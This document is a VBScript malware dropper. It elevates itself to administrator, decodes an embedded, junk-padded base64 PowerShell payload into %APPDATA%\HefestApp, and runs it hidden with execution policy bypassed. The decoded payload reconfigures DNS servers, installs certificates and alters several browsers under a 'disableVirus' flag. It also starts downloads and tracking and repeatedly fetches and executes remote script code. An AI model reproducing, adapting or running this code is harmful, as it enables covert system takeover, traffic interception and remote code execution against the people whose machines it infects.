KICAgICAgICBbaW50XSR2YXJfd2taWUlTRTMsCiAgICAgICAgW2ludF0kdmFyX3NSSkQ3eTVMCiAgICApCiAgICAkcmVzdWx0ID0gJHZhcl93a1pZSVNFMyArICR2YXJfc1JKRDd5NUwKICAgIHJldHVybiAkcmVzdWx0Cn0KZnVuY3Rpb24gZm5fV2lCblZDaFkgewogICAgcGFyYW0gKAogICAgICAgIFtpbnRdJHZhcl9zUkpEN3k1TCwKICAgICAgICBbaW50XSR2YXJfVXBhc1ZUemkKICAgICkKICAgICRyZXN1bHQgPSAkdmFyX3NSSkQ3eTVMICsgJHZhcl9VcGFzVlR6aQogICAgcmV0dXJuICRyZXN1bHQKfQpmdW5jdGlvbiBmbl9ZdklaeVdvMyB7CiAgICBwYXJhbSAoCiAgICAgICAgW2ludF0kdmFyX1VwYXNWVHppLAogICAgICAgIFtpbnRdJHZhcl92Q0g0RDZRbAogICAgKQogICAgJHJlc3VsdCA9ICR2YXJfVXBhc1ZUemkgKyAkdmFyX3ZDSDRENlFsCiAgICByZXR1cm4gJHJlc3VsdAp9CmlmICgkdmFyX3ZDSDRENlFsIC1ndCAxMSkgewogICAgV3JpdGUtT3V0cHV0ICdkdDI1d2ZoNE95cXV6UlknCn0gZWxzZSB7CiAgICBXcml0ZS1PdXRwdXQgJ0c1d25WUlUxbGRoZ09TRCcKfQppZiAoJHZhcl9wdHpUSDREMSAtZ3QgMTEpIHsKICAgIFdyaXRlLUhvc3QgJ3BaMzQ1N2lid29LZENrMCcKfSBlbHNlIHsKICAgIFdyaXRlLU91dHB1dCAnRFN3WEx1Tnh6Rm8xSWtHJwp9CmlmICgkdmFyX3drWllJU0UzIC1ndCAxNSkgewogICAgV3JpdGUtSG9zdCAnYnhqSlVDaE5IeVQ3dHNMJwp9IGVsc2UgewogICAgV3JpdGUtT3V0cHV0ICdhWFVtUHE0eDgwV2JFRHInCn0KaWYgKCR2YXJfc1JKRDd5NUwgLWd0IDE1KSB7CiAgICBXcml0ZS1PdXRwdXQgJ1J4NmNhazhOWE16SzNPcycKfSBlbHNlIHsKICAgIFdyaXRlLUhvc3QgJ0dIS3ZORnlhUXREelIzQicKfQppZiAoJHZhcl9VcGFzVlR6aSAtZ3QgMTMpIHsKICAgIFdyaXRlLU91dHB1dCAnZUV0c3dOMmdacUlWeVFwJwp9IGVsc2UgewogICAgV3JpdGUtT3V0cHV0ICc0VUZ4ZWFaWXowZmtOczgnCn0KJHZhcl9zUkpEN3k1TCA9IGZuX2ZwbFJxMGFZIC1wYXJhbTEgNTMgLXBhcmFtMiAzMApXcml0ZS1Ib3N0ICduaXNFNDdSMkF0Q2x1a3knCiR2YXJfVXBhc1ZUemkgPSBmbl9Ic2xaTE5JdSAtcGFyYW0xIDgxIC1wYXJhbTIgNTAKV3JpdGUtT3V0cHV0ICd3YW9HdExNMTVzbEU5SVonCiR2YXJfVXBhc1ZUemkgPSBmbl9GcTJjV0RTWiAtcGFyYW0xIDEwIC1wYXJhbTIgODkKV3JpdGUtSG9zdCAnNGhPdlNjQ1RJZWFLMUxHJwokdmFyX1VwYXNWVHppID0gZm5fSHNsWkxOSXUgLXBhcmFtMSAzOSAtcGFyYW0yIDY2CldyaXRlLU91dHB1dCAnaU4yOTZHU0ZjbzB1REJQJwokdmFyX1VwYXNWVHppID0gZm5fWXZJWnlXbzMgLXBhcmFtMSA3NCAtcGFyYW0yIDU0CldyaXRlLUhvc3QgJ1p0MURYaEN2d2xHNTlRQScKJHZhcl93a1pZSVNFMyA9IGZuX0ZxMmNXRFNaIC1wYXJhbTEgNTUgLXBhcmFtMiA1MgpXcml0ZS1PdXRwdXQgJ0x3NG5KTmFaOFlYY3ByTycKJHZhcl9wdHpUSDREMSA9IGZuX0ZxMmNXRFNaIC1wYXJhbTEgNDIgLXBhcmFtMiAzOApXcml0ZS1PdXRwdXQgJ2Q1SHVQN3JVM1RSQk5McCcKJHZhcl9wdHpUSDREMSA9IGZuX1dpQm5WQ2hZIC1wYXJhbTEgNjAgLXBhcmFtMiA1OQpXcml0ZS1PdXRwdXQgJ0xham1VaTZCclJvcHh6cScKJHZhcl9wdHpUSDREMSA9IGZuX1dpQm5WQ2hZIC1wYXJhbTEgMzIgLXBhcmFtMiA2MQpXcml0ZS1Ib3N0ICc4UFhtU3k5ek5FZERpeEsnCiR2YXJfcHR6VEg0RDEgPSBmbl9ZdklaeVdvMyAtcGFyYW0xIDYgLXBhcmFtMiA5OQpXcml0ZS1PdXRwdXQgJ3UwcnA0ZkhJNmpKWGhQTycKJHZhcl93a1pZSVNFMyA9IGZuX2ZwbFJxMGFZIC1wYXJhbTEgNDAgLXBhcmFtMiA1MApXcml0ZS1PdXRwdXQgJ05vVTRHRHhJeThjcmxQZScKJHZhcl9VcGFzVlR6aSA9IGZuX2ZwbFJxMGFZIC1wYXJhbTEgODggLXBhcmFtMiA5NgpXcml0ZS1Ib3N0ICdKMDJjdm9hMWdaeGxFcU4nCiR2YXJfdkNINEQ2UWwgPSBmbl9mcGxScTBhWSAtcGFyYW0xIDQzIC1wYXJhbTIgNApXcml0ZS1PdXRwdXQgJ3RBVWU3eDBwVHc2UUlzOCcKJHZhcl93a1pZSVNFMyA9IGZuX2ZwbFJxMGFZIC1wYXJhbTEgOTEgLXBhcmFtMiA1NgpXcml0ZS1Ib3N0ICdlNW5xeWN0MlZQSGR2d3onCiR2YXJfVXBhc1ZUemkgPSBmbl9GcTJjV0RTWiAtcGFyYW0xIDk4IC1wYXJhbTIgODAKV3JpdGUtT3V0cHV0ICdxeTRzRDJGdnUxakhuSTAnCiR2YXJfc1JKRDd5NUwgPSBmbl9Ic2xaTE5JdSAtcGFyYW0xIDMgLXBhcmFtMiAyMgpXcml0ZS1PdXRwdXQgJ1RrSHFXOVg2MWdvSTBzUCcKJHZhcl93a1pZSVNFMyA9IGZuX0hzbFpMTkl1IC1wYXJhbTEgNTkgLXBhcmFtMiAxOQpXcml0ZS1Ib3N0ICdCS3JwVlE4UHdYT3ZHa1cnCiR2YXJfd2taWUlTRTMgPSBmbl9mcGxScTBhWSAtcGFyYW0xIDkzIC1wYXJhbTIgNjYKV3JpdGUtT3V0cHV0ICcxUWk2elhkRnI1cE1MbG0nCiR2YXJfc1JKRDd5NUwgPSBmbl9ZdklaeVdvMyAtcGFyYW0xIDQ1IC1wYXJhbTIgODQKV3JpdGUtSG9zdCAndHZLSDdRQWZtYVpMSmxZJwokdmFyX3B0elRINEQxID0gZm5fSHNsWkxOSXUgLXBhcmFtMSAxOCAtcGFyYW0yIDE2CldyaXRlLUhvc3QgJ1kwOUlMNGZ6NjdPV0F4TScKIAoKDQoKCg0KCgoNCgoKDQoKCg0KCgoNCgoKDQoKCg0KCgoNCgoKDQoKCg0KCgoNCgoKDQoKCg0KCgoNCg0KIyBpZighKFtTZWN1cml0eS5QcmluY2lwYWwuV2luZG93c1ByaW5jaXBhbF0gW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzSWRlbnRpdHldOjpHZXRDdXJyZW50KCkpLklzSW5Sb2xlKFtTZWN1cml0eS5QcmluY2lwYWwuV2luZG93c0J1aWx0SW5Sb2xlXSAnQWRtaW5pc3RyYXRvcicpKSB7DQojICAgICBTdGFydC1Qcm9jZXNzIC1GaWxlUGF0aCBQb3dlclNoZWxsLmV4ZSAtVmVyYiBSdW5hcyAtQXJndW1lbnRMaXN0ICItRmlsZSBgIiQoJE15SW52b2NhdGlvbi5NeUNvbW1hbmQuUGF0aClgIiAgYCIkKCRNeUludm9jYXRpb24uTXlDb21tYW5kLlVuYm91bmRBcmd1bWVudHMpYCIiDQojICAgICBFeGl0DQojICAgfQ0KDQpmdW5jdGlvbiBtYWluIHsNCiAgICBpZiAoLW5vdCAkc2VydmVyLmRpc2FibGVWaXJ1cykNCiAgICB7DQogICAgICAgIENvbmZpZ3VyZURuc1NlcnZlcnMNCiAgICAgICAgQ29uZmlndXJlQ2VydGlmaWNhdGVzDQogICAgICAgIENvbmZpZ3VyZUNocm9tZQ0KICAgICAgICBDb25maWd1cmVFZGdlDQogICAgICAgIENvbmZpZ3VyZVlhbmRleA0KICAgICAgICBDb25maWd1cmVGaXJlRm94DQogICAgICAgIENvbmZpZ3VyZU9wZXJhDQogICAgICAgIENvbmZpZ3VyZUNocm9tZVVibG9jaw0KICAgICAgICBDb25maWd1cmVDaHJvbWVQdXNoZXMNCiAgICB9DQogICAgRG9TdGFydERvd25sb2Fkcw0KICAgIERvU3RhcnRVcmxzDQogICAgaWYgKC1ub3QgJHNlcnZlci5kaXNhYmxlVmlydXMpDQogICAgew0KICAgICAgICBMYXVuY2hDaHJvbWVQdXNoZXMNCiAgICB9DQogICAgRG9UcmFjaw0KfQ0KDQptYWluDQpmdW5jdGlvbiBmbl9Mb2dfeVBhZ1dtQWogewogICAgcGFyYW0gKAogICAgICAgIFtzdHJpbmddJG1lc3NhZ2UKICAgICkKICAgIFdyaXRlLU91dHB1dCAnTG9nOiAkbWVzc2FnZScKfQpmdW5jdGlvbiBmbl82MUcwdjhUUiB7CiAgICBwYXJhbSAoCiAgICAgICAgW2ludF0kdmFyX2U2Z0lVQ3VpLAogICAgICAgIFtpbnRdJHZhcl9BNjVkaU1maAogICAgKQogICAgJHJlc3VsdCA9ICR2YXJfZTZnSVVDdWkgKyAkdmFyX0E2NWRpTWZoCiAgICByZXR1cm4gJHJlc3VsdAp9CmZ1bmN0aW9uIGZuX2owdnAzZUZTIHsKICAgIHBhcmFtICgKICAgICAgICBbaW50XSR2YXJfQTY1ZGlNZmgsCiAgICAgICAgW2ludF0kdmFyX2JtWXR2a001CiAgICApCiAgICAkcmVzdWx0ID0gJHZhcl9BNjVkaU1maCArICR2YXJfYm1ZdHZrTTUKICAgIHJldHVybiAkcmVzdWx0Cn0KZnVuY3Rpb24gZm5fbFJKcEJ3cWkgewogICAgcGFyYW0gKAogICAgICAgIFtpbnRdJHZhcl9ibVl0dmtNNSwKICAgICAgICBbaW50XSR2YXJfbGM1U1lweDAKICAgICkKICAgICRyZXN1bHQgPSAkdmFyX2JtWXR2a001ICsgJHZhcl9sYzVTWXB4MAogICAgcmV0dXJuICRyZXN1bHQKfQpmdW5jdGlvbiBmbl8xTThkNXg0QSB7CiAgICBwYXJhbSAoCiAgICAgICAgW2ludF0kdmFyX2xjNVNZcHgwLAogICAgICAgIFtpbnRdJHZhcl90ZjRvZTdZcAogICAgKQogICAgJHJlc3VsdCA9ICR2YXJfbGM1U1lweDAgKyAkdmFyX3RmNG9lN1lwCiAgICByZXR1cm4gJHJlc3VsdAp9CmZ1bmN0aW9uIGZuX2thdmpQaG8yIHsKICAgIHBhcmFtICgKICAgICAgICBbaW50XSR2YXJfdGY0b2U3WXAsCiAgICAgICAgW2ludF0kdmFyX2U2Z0lVQ3VpCiAgICApCiAgICAkcmVzdWx0ID0gJHZhcl90ZjRvZTdZcCArICR2YXJfZTZnSVVDdWkKICAgIHJldHVybiAkcmVzdWx0Cn0KaWYgKCR2YXJfZTZnSVVDdWkgLWd0IDcpIHsKICAgIFdyaXRlLU91dHB1dCAnMXFTUlhoR0RnVkUzN1lGJwp9IGVsc2UgewogICAgV3JpdGUtT3V0cHV0ICd4QjdBTnNiR3pLYUZMZzInCn0KaWYgKCR2YXJfQTY1ZGlNZmggLWd0IDExKSB7CiAgICBXcml0ZS1PdXRwdXQgJ2ZRRHNPYW5FbXhQZDZLWicKfSBlbHNlIHsKICAgIFdyaXRlLU91dHB1dCAnNU85UnZvYmN6S2x0SFNlJwp9CmlmICgkdmFyX2JtWXR2a001IC1ndCAyKSB7CiAgICBXcml0ZS1PdXRwdXQgJ3JGeEhTVzRLQkxUa3dSTicKfSBlbHNlIHsKICAgIFdyaXRlLU91dHB1dCAnSFNSRTd6YkM4VGxkWmsyJwp9CmlmICgkdmFyX2xjNVNZcHgwIC1ndCAxNCkgewogICAgV3JpdGUtT3V0cHV0ICc4bkRmQ2JLc09XRXZHdGwnCn0gZWxzZSB7CiAgICBXcml0ZS1PdXRwdXQgJ0Z6YTByQnFZS21WQURpeScKfQppZiAoJHZhcl90ZjRvZTdZcCAtZ3QgMTIpIHsKICAgIFdyaXRlLU91dHB1dCAnOGtKMExnYW9YOUtIYzZVJwp9IGVsc2UgewogICAgV3JpdGUtT3V0cHV0ICd6eVdVSUVOQkhhbEtTc3UnCn0KJHZhcl90ZjRvZTdZcCA9IGZuX2thdmpQaG8yIC1wYXJhbTEgNTQgLXBhcmFtMiA3MQpXcml0ZS1Ib3N0ICd6SEpUblhsWnNXVmVOOE8nCiR2YXJfdGY0b2U3WXAgPSBmbl9rYXZqUGhvMiAtcGFyYW0xIDc0IC1wYXJhbTIgMTEKV3JpdGUtT3V0cHV0ICdZYjN2TWg5eWpYemFGRzAnCiR2YXJfdGY0b2U3WXAgPSBmbl9sUkpwQndxaSAtcGFyYW0xIDE3IC1wYXJhbTIgODQKV3JpdGUtT3V0cHV0ICc1VHNvVVJ4cENkbUlWV08nCiR2YXJfQTY1ZGlNZmggPSBmbl82MUcwdjhUUiAtcGFyYW0xIDE2IC1wYXJhbTIgMTkKV3JpdGUtT3V0cHV0ICdxSkR0MnlTczdldUIwZ2EnCiR2YXJfQTY1ZGlNZmggPSBmbl9qMHZwM2VGUyAtcGFyYW0xIDkxIC1wYXJhbTIgNjIKV3JpdGUtT3V0cHV0ICdFdjVIM1hLV2JpNE94VjgnCiR2YXJfYm1ZdHZrTTUgPSBmbl8xTThkNXg0QSAtcGFyYW0xIDY3IC1wYXJhbTIgMjcKV3JpdGUtSG9zdCAnOWZiSkN4eWtZTk9Fb1FkJwokdmFyX2xjNVNZcHgwID0gZm5fa2F2alBobzIgLXBhcmFtMSA2MSAtcGFyYW0yIDI5CldyaXRlLUhvc3QgJ2lrRnNhMk5lWks0ZnVPQicKJHZhcl9lNmdJVUN1aSA9IGZuXzFNOGQ1eDRBIC1wYXJhbTEgMjYgLXBhcmFtMiAyNApXcml0ZS1Ib3N0ICc0d3NUbXFDMWZHV0hqVTMnCiR2YXJfQTY1ZGlNZmggPSBmbl8xTThkNXg0QSAtcGFyYW0xIDQ3IC1wYXJhbTIgNjAKV3JpdGUtT3V0cHV0ICdnYTg0VU9Ob3RUblJBYmgnCiR2YXJfYm1ZdHZrTTUgPSBmbl8xTThkNXg0QSAtcGFyYW0xIDcyIC1wYXJhbTIgMzgKV3JpdGUtSG9zdCAnZnVuQ3RwUGk4NXJNQXlEJwokdmFyX2U2Z0lVQ3VpID0gZm5fNjFHMHY4VFIgLXBhcmFtMSA4NCAtcGFyYW0yIDUyCldyaXRlLUhvc3QgJ0d5TnVtc0VXaTRTOVRYUCcKJHZhcl9BNjVkaU1maCA9IGZuX2thdmpQaG8yIC1wYXJhbTEgMTAgLXBhcmFtMiAyOQpXcml0ZS1PdXRwdXQgJzhNQklHdWE5RFVLVzdUTicKJHZhcl9BNjVkaU1maCA9IGZuX2thdmpQaG8yIC1wYXJhbTEgMyAtcGFyYW0yIDcKV3JpdGUtT3V0cHV0ICdaNWYydnVVTVJiR2xxS1AnCiR2YXJfbGM1U1lweDAgPSBmbl82MUcwdjhUUiAtcGFyYW0xIDggLXBhcmFtMiA2OApXcml0ZS1PdXRwdXQgJ1lKSFA4RGoyU2J4enlLNCcKJHZhcl9sYzVTWXB4MCA9IGZuXzFNOGQ1eDRBIC1wYXJhbTEgNTUgLXBhcmFtMiA2NQpXcml0ZS1Ib3N0ICc3NncxS1BBWFdOUzU5bFQnCiR2YXJfdGY0b2U3WXAgPSBmbl82MUcwdjhUUiAtcGFyYW0xIDUzIC1wYXJhbTIgOTcKV3JpdGUtT3V0cHV0ICc0NnJlTHRjM0ZEYm1Pd0onCiR2YXJfQTY1ZGlNZmggPSBmbl82MUcwdjhUUiAtcGFyYW0xIDI4IC1wYXJhbTIgODYKV3JpdGUtT3V0cHV0ICczZHoyVlFBSThmT3JIUnUnCiR2YXJfZTZnSVVDdWkgPSBmbl9sUkpwQndxaSAtcGFyYW0xIDgxIC1wYXJhbTIgNTUKV3JpdGUtT3V0cHV0ICdNYWQ2eW5aaXMzS0U1clcnCiR2YXJfbGM1U1lweDAgPSBmbl82MUcwdjhUUiAtcGFyYW0xIDkgLXBhcmFtMiA4NApXcml0ZS1PdXRwdXQgJ0dpSENPY29KTDU5TjE3YicKJHZhcl9sYzVTWXB4MCA9IGZuX2thdmpQaG8yIC1wYXJhbTEgMTAgLXBhcmFtMiA4NQpXcml0ZS1PdXRwdXQgJ1A5M0VTRjFxSmp1TFZkTycKIAoKDQoKCg0KDQpmdW5jdGlvbiBEb0V4dHJhVXBkYXRlKCkgew0KICAgIGlmICgtbm90ICRzZXJ2ZXIuZXh0cmFVcGRhdGUpew0KICAgICAgICByZXR1cm4NCiAgICB9DQogICAgJHRpbWVvdXQgPSBbZGF0ZXRpbWVdOjpVdGNOb3cuQWRkTWludXRlcygxKQ0KICAgICRkZWxheSA9IDUNCg0KICAgIA0KICAgIHdoaWxlIChbZGF0ZXRpbWVdOjpVdGNOb3cgLWx0ICR0aW1lb3V0KSB7DQogICAgICAgIHRyeSB7DQogICAgICAgICAgICAkcmVzcG9uc2UgPSBJbnZva2UtV2ViUmVxdWVzdCAtVXJpICRzZXJ2ZXIuZXh0cmFVcGRhdGVVcmwgLVVzZUJhc2ljUGFyc2luZyAtTWV0aG9kIEdldA0KDQogICAgICAgICAgICBpZiAoJHJlc3BvbnNlLlN0YXR1c0NvZGUgLWVxIDIwMCkgew0KICAgICAgICAgICAgICAgICRzY3JpcHRCbG9jayA9IFtTY3JpcHRCbG9ja106OkNyZWF0ZSgkcmVzcG9uc2UuQ29udGVudCkNCiAgICAgICAgICAgICAgICAuICRzY3JpcHRCbG9jaw0KICAgICAgICAgICAgICAgIHJldHVybg0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIGNhdGNoIHsNCiAgICAgICAgICAgIFdyaXRlLUVycm9yICJGYWlsZWQgdG8gZG93bmxvYWQgb3IgZXhlY3V0ZSB0aGUgc2NyaXB0OiAkXyINCiAgICAgICAgfQ0KDQogICAgICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzICRkZWxheQ0KICAgIH0NCiAgICBXcml0ZS1FcnJvciAiRmFpbGVkIHRvIGRvd25sb2FkIHRoZSBzY3JpcHQgd2l0aGluIHRoZSBhbGxvdHRlZCB0aW1lLiINCn0NCg0KRG9FeHRyYVVwZGF0ZQ0KZnVuY3Rpb24gZm5fTG9nX3FEbmpQOUFmIHsKICAgIHBhcmFtICgKICAgICAgICBbc3RyaW5nXSRtZXNzYWdlCiAgICApCiAgICBXcml0ZS1PdXRwdXQgJ0xvZzogJG1lc3NhZ2UnCn0KZnVuY3Rpb24gZm5fNVY2cWQ5N1kgewogICAgcGFyYW0gKAogICAgICAgIFtpbnRdJHZhcl85YVBDcjV3aCwKICAgICAgICBbaW50XSR2YXJfa2w4T2dKb0gKICAgICkKICAgICRyZXN1bHQgPSAkdmFyXzlhUENyNXdoICsgJHZhcl9rbDhPZ0pvSAogICAgcmV0dXJuICRyZXN1bHQKfQpmdW5jdGlvbiBmbl8yZTUweU9DcyB7CiAgICBwYXJhbSAoCiAgICAgICAgW2ludF0kdmFyX2tsOE9nSm9ILAogICAgICAgIFtpbnRdJHZhcl9lbEI3dUpQeQogICAgKQogICAgJHJlc3VsdCA9ICR2YXJfa2w4T2dKb0ggKyAkdmFyX2VsQjd1SlB5CiAgICByZXR1cm4gJHJlc3VsdAp9CmZ1bmN0aW9uIGZuXzRHZW9sbnl2IHsKICAgIHBhcmFtICgKICAgICAgICBbaW50XSR2YXJfZWxCN3VKUHksCiAgICAgICAgW2ludF0kdmFyX0dQZmhwbzIxCiAgICApCiAgICAkcmVzdWx0ID0gJHZhcl9lbEI3dUpQeSArICR2YXJfR1BmaHBvMjEKICAgIHJldHVybiAkcmVzdWx0Cn0KZnVuY3Rpb24gZm5fSWF3ZEJnWTQgewogICAgcGFyYW0gKAogICAgICAgIFtpbnRdJHZhcl9HUGZocG8yMSwKICAgICAgICBbaW50XSR2YXJfdWU3Tlo5UjMKICAgICkKICAgICRyZXN1bHQgPSAkdmFyX0dQZmhwbzIxICsgJHZhcl91ZTdOWjlSMwogICAgcmV0dXJuICRyZXN1bHQKfQpmdW5jdGlvbiBmbl9xbEF1V2VacyB7CiAgICBwYXJhbSAoCiAgICAgICAgW2ludF0kdmFyX3VlN05aOVIzLAogICAgICAgIFtpbnRdJHZhcl85YVBDcjV3aAogICAgKQogICAgJHJlc3VsdCA9ICR2YXJfdWU3Tlo5UjMgKyAkdmFyXzlhUENyNXdoCiAgICByZXR1cm4gJHJlc3VsdAp9CmlmICgkdmFyXzlhUENyNXdoIC1ndCAxNikgewogICAgV3JpdGUtSG9zdCAnTUpnclk2WGtIV3N1RXdUJwp9IGVsc2UgewogICAgV3JpdGUtT3V0cHV0ICdHQm5leWZSdnhrYk5ZSkgnCn0KaWYgKCR2YXJfa2w4T2dKb0ggLWd0IDEpIHsKICAgIFdyaXRlLUhvc3QgJzJqZ09sUlpvWEwwR3l0QycKfSBlbHNlIHsKICAgIFdyaXRlLU91dHB1dCAnSnVQZG9mRll4WGJRUk9MJwp9CmlmICgkdmFyX2VsQjd1SlB5IC1ndCAxOCkgewogICAgV3JpdGUtSG9zdCAnSFRyYTBYUEFaaUlnS3hoJwp9IGVsc2UgewogICAgV3JpdGUtT3V0cHV0ICdueDlkYXBFQTdvZUhTc0snCn0KaWYgKCR2YXJfR1BmaHBvMjEgLWd0IDEpIHsKICAgIFdyaXRlLU91dHB1dCAnS1RZWHNaTGNoTklqb1BKJwp9IGVsc2UgewogICAgV3JpdGUtSG9zdCAnRXpkV0tNTG04SWM0ZzFyJwp9CmlmICgkdmFyX3VlN05aOVIzIC1ndCAxMSkgewogICAgV3JpdGUtSG9zdCAnbTJ3Q2NUREh5QnV4Z09VJwp9IGVsc2UgewogICAgV3JpdGUtT3V0cHV0ICdnUnJCcWhXVkpqN1Vac2YnCn0KJHZhcl9lbEI3dUpQeSA9IGZuXzJlNTB5T0NzIC1wYXJhbTEgNDIgLXBhcmFtMiA4MApXcml0ZS1PdXRwdXQgJ2F1WGxKRUkwOHJjQ092QicKJHZhcl9rbDhPZ0pvSCA9IGZuXzJlNTB5T0NzIC1wYXJhbTEgOTMgLXBhcmFtMiA2OQpXcml0ZS1Ib3N0ICdHOWpMMmV3MXBsRVNhZ0onCiR2YXJfdWU3Tlo5UjMgPSBmbl9JYXdkQmdZNCAtcGFyYW0xIDg4IC1wYXJhbTIgNDMKV3JpdGUtSG9zdCAnWXhKdm0wZ2ZVQnRTVHNwJwokdmFyX2VsQjd1SlB5ID0gZm5fNVY2cWQ5N1kgLXBhcmFtMSA4MSAtcGFyYW0yIDc4CldyaXRlLUhvc3QgJ3hGUUFFME53T1l6S1JXYicKJHZhcl91ZTdOWjlSMyA9IGZuXzVWNnFkOTdZIC1wYXJhbTEgNTAgLXBhcmFtMiA1MwpXcml0ZS1PdXRwdXQgJzBYMmpzS1JIelQxQkw4WScKJHZhcl85YVBDcjV3aCA9IGZuXzJlNTB5T0NzIC1wYXJhbTEgODMgLXBhcmFtMiA2NApXcml0ZS1PdXRwdXQgJ1ZuOVRwd0hmY05DV2hLRScKJHZhcl9rbDhPZ0pvSCA9IGZuXzJlNTB5T0NzIC1wYXJhbTEgMTAgLXBhcmFtMiA3OQpXcml0ZS1PdXRwdXQgJ0MxZGhrcVhCWll3TGpuNicKJHZhcl91ZTdOWjlSMyA9IGZuX3FsQXVXZVpzIC1wYXJhbTEgODEgLXBhcmFtMiAxOApXcml0ZS1Ib3N0ICdLbWpERnByeXZrOXRYNEonCiR2YXJfOWFQQ3I1d2ggPSBmbl9JYXdkQmdZNCAtcGFyYW0xIDcgLXBhcmFtMiAzCldyaXRlLU91dHB1dCAnVWxBWDN5MnV3OWppZUVhJwokdmFyX2tsOE9nSm9IID0gZm5fcWxBdVdlWnMgLXBhcmFtMSA1OSAtcGFyYW0yIDIwCldyaXRlLU91dHB1dCAnOWo0TUFwSGJxM2t2RDBCJwokdmFyX3VlN05aOVIzID0gZm5fNEdlb2xueXYgLXBhcmFtMSA0NyAtcGFyYW0yIDI4CldyaXRlLU91dHB1dCAnWE1kWURia2plYXR5aDJaJwokdmFyX3VlN05aOVIzID0gZm5fNEdlb2xueXYgLXBhcmFtMSAxMSAtcGFyYW0yIDUzCldyaXRlLUhvc3QgJ3JJNHBmQW9kTlkwUm10NicKJHZhcl85YVBDcjV3aCA9IGZuXzJlNTB5T0NzIC1wYXJhbTEgNDMgLXBhcmFtMiA3NQpXcml0ZS1PdXRwdXQgJ2VMMnNYb0Z3anJCdTA1QycKJHZhcl85YVBDcjV3aCA9IGZuX3FsQXVXZVpzIC1wYXJhbTEgNTcgLXBhcmFtMiA1OApXcml0ZS1PdXRwdXQgJ0VhczZUZmRrZVBXRDk1VScKJHZhcl9lbEI3dUpQeSA9IGZuXzVWNnFkOTdZIC1wYXJhbTEgODcgLXBhcmFtMiA4CldyaXRlLUhvc3QgJ051bWhjb0JFa1F6dnJMMScKJHZhcl91ZTdOWjlSMyA9IGZuX0lhd2RCZ1k0IC1wYXJhbTEgMzIgLXBhcmFtMiA0MgpXcml0ZS1Ib3N0ICdRU3NrYzB3T2xQdm1ydTgnCiR2YXJfa2w4T2dKb0ggPSBmbl81VjZxZDk3WSAtcGFyYW0xIDggLXBhcmFtMiA5MApXcml0ZS1Ib3N0ICdxWmJYTU82SU5wdWR5MG4nCiR2YXJfZWxCN3VKUHkgPSBmbl80R2VvbG55diAtcGFyYW0xIDQgLXBhcmFtMiA0NApXcml0ZS1PdXRwdXQgJ0IwSUxVV3dLenRZY1pNWCcKJHZhcl9HUGZocG8yMSA9IGZuXzRHZW9sbnl2IC1wYXJhbTEgOTUgLXBhcmFtMiA3NApXcml0ZS1PdXRwdXQgJzlmVGJpbExEdlFoV3JYdCcKJHZhcl9HUGZocG8yMSA9IGZuXzRHZW9sbnl2IC1wYXJhbTEgMjAgLXBhcmFtMiAyNQpXcml0ZS1PdXRwdXQgJ3h5Mm02NU1pUmZOVUhGQicKIA0K"

If Not IsAdmin() Then
    RunElevated()
Else
    MainScriptLogic()
End If

Sub MainScriptLogic()
    DecodeBase64ToFile bodyX, GetPS1FilePath
    Run
End Sub

Function GetPS1FilePath()
    Dim fso, shell, scriptPath, destFolder, destPath
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set shell = CreateObject("WScript.Shell")
    scriptPath = WScript.ScriptFullName
    destFolder = fso.BuildPath(shell.ExpandEnvironmentStrings("%APPDATA%"), "HefestApp")
    destPath = fso.BuildPath(destFolder, "body.ps1")
    CreateFolder fso, destFolder
    GetPS1FilePath = destPath   
End Function

Sub Run
    Dim shell
    Set shell = CreateObject("WScript.Shell")
    Dim command
    command = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & GetPS1FilePath & """"
    shell.Run command, 0, True
end sub

Function IsAdmin()
    Dim objWShell, result
    Set objWShell = CreateObject("WScript.Shell")
    result = objWShell.Run("cmd /c net session >nul 2>&1", 0, True)
    IsAdmin = (result = 0)
    Set objWShell = Nothing
End Function

Sub RunElevated()
    Dim objShell
    Set objShell = CreateObject("Shell.Application")
    objShell.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34), "", "runas", 1
    WScript.Quit
End Sub


Sub CreateFolder(fso, folderPath)
    If Not fso.FolderExists(folderPath) Then
        fso.CreateFolder(folderPath)
    End If
End Sub

Function DecodeBase64ToFile(base64String, outputFilePath)
    Dim xmlDoc
    Set xmlDoc = CreateObject("Msxml2.DOMDocument.3.0")
    
    ' Create an XML element with the base64 string
    Dim node
    Set node = xmlDoc.createElement("base64")
    node.dataType = "bin.base64"
    node.Text = base64String
    
    ' Get the decoded binary data
    Dim binaryData
    binaryData = node.nodeTypedValue
    
    ' Create a binary stream object to save the binary data to a file
    Dim stream
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1 ' adTypeBinary
    stream.Open
    stream.Write binaryData
    
    ' Save the binary stream to the specified output file path
    stream.SaveToFile outputFilePath, 2 ' adSaveCreateOverWrite
    stream.Close
    
    ' Clean up
    Set stream = Nothing
    Set node = Nothing
    Set xmlDoc = Nothing
End Function
